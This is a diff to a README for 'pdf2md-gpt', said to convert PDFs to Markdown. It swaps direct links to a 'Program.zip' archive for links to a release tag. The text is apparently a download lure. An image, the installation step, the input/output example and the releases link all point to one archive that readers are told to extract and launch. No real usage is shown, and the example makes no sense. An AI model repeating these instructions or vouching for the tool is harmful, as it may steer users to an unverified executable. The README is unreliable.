@@ -1,7 +1,7 @@
 
 # 📄 pdf2md-gpt
 
-![pdf2md-gpt](https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip)
+![pdf2md-gpt](https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0)
 
 Converts PDF documents to Markdown format using GPT-4o-mini's vision capabilities. 🚀
 
@@ -23,7 +23,7 @@ Welcome to pdf2md-gpt - your go-to tool for seamlessly converting PDF files to M
 - Fast and reliable results
 
 ## Installation
-To get started with pdf2md-gpt, simply download the provided [https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip](https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip) and extract the contents. Launch the application and you're ready to start converting PDFs to Markdown with ease.
+To get started with pdf2md-gpt, simply download the provided [https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0](https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0) and extract the contents. Launch the application and you're ready to start converting PDFs to Markdown with ease.
 
 ## Usage
 Using pdf2md-gpt is straightforward. Follow these steps to convert your PDF files:
@@ -36,8 +36,8 @@ Using pdf2md-gpt is straightforward. Follow these steps to convert your PDF file
 ## Examples
 Here's a quick example to showcase the power of pdf2md-gpt:
 
-**Input:** https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip
-**Output:** https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip
+**Input:** https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0
+**Output:** https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0
 
 With just a few clicks, your PDF content is transformed into Markdown format, ready for use in your projects.
 
@@ -49,6 +49,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-Visit the [Releases](https://github.com/Diego2134/pdf2md-gpt/releases/download/v1.0/Program.zip) section for the latest updates and versions of pdf2md-gpt.
+Visit the [Releases](https://github.com/Diego2134/pdf2md-gpt/releases/tag/v2.0) section for the latest updates and versions of pdf2md-gpt.
 
 Feel free to reach out with any questions, suggestions, or feedback. Happy converting! 📄✨
